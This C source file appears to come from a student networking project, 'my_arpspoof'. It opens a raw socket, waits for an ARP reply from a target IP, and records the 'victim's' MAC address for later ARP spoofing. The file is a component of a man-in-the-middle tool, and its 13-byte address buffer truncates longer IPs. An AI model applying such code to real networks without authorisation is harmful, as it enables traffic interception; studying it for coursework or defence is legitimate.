/*
** EPITECH PROJECT, 2019
** sltlesbroclrb
** File description:
** my_arpspoof
*/

#include "spoof.h"
#include "utils.h"
#include "packet.h"
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <stdlib.h>
#include <errno.h>
#include <ctype.h>

uint8_t *allocate_ustrmem(int len)
{
    void *tmp = malloc(len * sizeof(uint8_t));

    if (tmp) {
        memset(tmp, 0, len * sizeof(uint8_t));
        return (tmp);
    }
    return (NULL);
}

void print_victim(arp_header_t *arphdr, uint8_t *etherframe)
{
    printf("Found victim's MAC address: '");
    for (int i = 0; i < 5; i++)
        printf("%02X:", toupper(arphdr->__ar_sha[i]));
    printf("%02X'\n", toupper(arphdr->__ar_sha[5]));
    free(etherframe);
}

int create_socket(parameters_t *p)
{
    if ((p->recvsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL))) < 0) {
        perror("Failed socket creation when receiving");
        return (EXIT_FAIL);
    }
    return (p->recvsock);
}

int receive_loop(uint8_t *etherframe, arp_header_t *arp, parameters_t *p)
{
    char *address = malloc(sizeof(char) * 13);

    while (recv(p->recvsock, etherframe, IP_MAXPACKET, 0)) {
        if ((((etherframe[12]) << 8) + etherframe[13]) != ETH_P_ARP)
            continue;
        if (ntohs(arp->ar_op) != 2)
            continue;
        break;
    }
    snprintf(address, 13, "%u.%u.%u.%u\n",
        arp->__ar_sip[0], arp->__ar_sip[1], arp->__ar_sip[2],
        arp->__ar_sip[3]);
    if (strcmp(address, p->dip) == 0) {
        free(address);
        return (1);
    }
    free(address);
    return (0);
}

int receiving(parameters_t *p)
{
    p->recvsock = 0;
    uint8_t *etherframe = allocate_ustrmem(IP_MAXPACKET);
    arp_header_t *arphdr;
    int checking = 0;

    if ((p->recvsock = create_socket(p)) == EXIT_FAIL)
        return (EXIT_FAIL);
    arphdr = (arp_header_t *)(etherframe + 14);
    while (checking != 1)
        checking = receive_loop(etherframe, arphdr, p);
    close(p->recvsock);
    memcpy(p->dest_mac, arphdr->__ar_sha, 6);
    print_victim(arphdr, etherframe);
    return (EXIT_SUCCESS);
}
